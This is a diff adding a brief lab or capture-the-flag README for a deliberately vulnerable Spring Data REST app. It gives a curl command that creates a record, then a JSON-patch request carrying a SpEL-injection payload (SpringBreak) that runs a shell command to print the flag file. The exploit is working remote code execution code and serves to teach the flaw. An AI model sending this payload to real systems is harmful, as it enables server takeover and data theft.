@@ -1,0 +1,18 @@
+create a person:
+
+```
+curl -i -H 'Content-Type: application/json' -XPOST http://localhost:8080/people -d '{"firstName":"first","lastName":"last"}'
+```
+
+Now exploit the vulnerability and grab the flag
+
+```
+curl -i -H 'Content-Type: application/json-patch+json' -XPATCH http://localhost:8080/people/1 -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"cat \" + T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F)) + \"flag.txt\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]'
+
+
+```
+
+this exploits a vulnerability in Spring-Data-Rest called [SpringBreak](https://github.com/m3ssap0/SpringBreakVulnerableApp)
+
+
+
